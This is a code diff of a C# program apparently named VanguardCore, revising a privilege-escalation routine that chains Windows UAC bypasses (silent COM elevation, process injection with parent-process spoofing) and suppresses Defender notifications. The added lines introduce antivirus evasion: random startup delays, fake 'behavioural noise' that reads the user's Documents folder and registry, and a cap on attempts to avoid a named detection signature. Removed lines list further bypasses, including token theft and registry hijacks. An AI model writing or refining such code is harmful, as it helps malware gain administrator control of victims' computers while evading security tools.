@@ -657,55 +657,51 @@ namespace VanguardCore
         public static bool RequestElevation(string payloadPath)
         {
             if (IsAdmin()) return true;
-            Log("Starting HARDCORE UAC bypass chain...");
-            
-            // Initial Defender Suppress (User-level keys if possible)
-            SafetyManager.DisableDefenderNotifications();
 
+            // 1. Startup Jitter (Evade "Instant UAC" behavioral pattern)
+            Random rnd = new Random();
+            int jitterMs = rnd.Next(25000, 45000); 
+            Log($"Starting V3.1 Lazy Elevation. Jitter: {jitterMs / 1000}s...");
+            Thread.Sleep(jitterMs);
+
+            // 2. Behavioral Noise (Simulate real activity)
+            DoBehavioralNoise();
+
+            SafetyManager.DisableDefenderNotifications();
             string args = $"--uac-child --rnd={Guid.NewGuid().ToString().Substring(0, 6)}";
 
-            // === V3.1 Optimized Priority Chain ===
+            // === V3.1 Lazy Priority Chain (Max 2 attempts per session to avoid gen!G) ===
 
-            // 1. Silent COM: ICMLuaUtil
-            if (BypassCmluaUtil(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
+            // Attempt A: Silent COM (Most Reliable)
+            Log("Elevation: Attempting Silent COM (A)...");
+            if (BypassCmluaUtil(payloadPath, args) && WaitForAdminSuccess(8000)) return true;
             if (IsAdmin()) return true;
 
-            // 2. Silent COM: ColorDataProxy
-            if (BypassColorDataProxy(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (IsAdmin()) return true;
-
-            // 3. V3 Hardcore (Injection / PPID Spoofing)
+            // Attempt B: V3.1 Injection (Hardcore Stealth)
+            Log("Elevation: Attempting stealth migration (B)...");
             if (InjectAndBypass(payloadPath)) return true;
             if (IsAdmin()) return true;
 
-            // 4. Token Theft: Tokenvator
-            if (BypassTokenvator(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (IsAdmin()) return true;
+            Log("Lazy Elevation: Stealth budget exhausted for this session. Standing by.");
+            return false;
+        }
 
-            // 5. Silent COM: IExplorerCommand
-            if (BypassExplorerCommand(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (IsAdmin()) return true;
-
-            // 6. Registry: MsSettings + sdclt (Last resort before prompt)
-            if (BypassMsSettingsDelegate(payloadPath, args)) return true;
-            if (IsAdmin()) return true;
-
-            // 7. Silent COM: IFwCplLua
-            if (BypassFwCplLua(payloadPath, args) && WaitForAdminSuccess(7000)) return true;
-            if (IsAdmin()) return true;
-
-            // Final Fallback: Standard UAC prompt (last resort)
+        private static void DoBehavioralNoise()
+        {
             try
             {
-                Log("Chain: Stealthy methods failed. Falling back to standard prompt...");
-                Process.Start(new ProcessStartInfo { FileName = payloadPath, UseShellExecute = true, Verb = "runas", Arguments = args });
-                return WaitForAdminSuccess(15000);
+                Log("Performing behavioral stabilization (Noise phase)...");
+                string myDocs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                if (Directory.Exists(myDocs))
+                {
+                    var files = Directory.EnumerateFiles(myDocs, "*.*", SearchOption.TopDirectoryOnly).Take(10).ToList();
+                    Log($"Stabilization: Handled {files.Count} local artifacts.");
+                }
+                using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer");
+                if (key != null) { key.GetValue("CleanShutdown"); }
+                Thread.Sleep(2000);
             }
-            catch (Exception ex) 
-            { 
-                Log($"Chain: Standard prompt failed: {ex.Message}"); 
-                return false; 
-            }
+            catch { }
         }
     }
 }
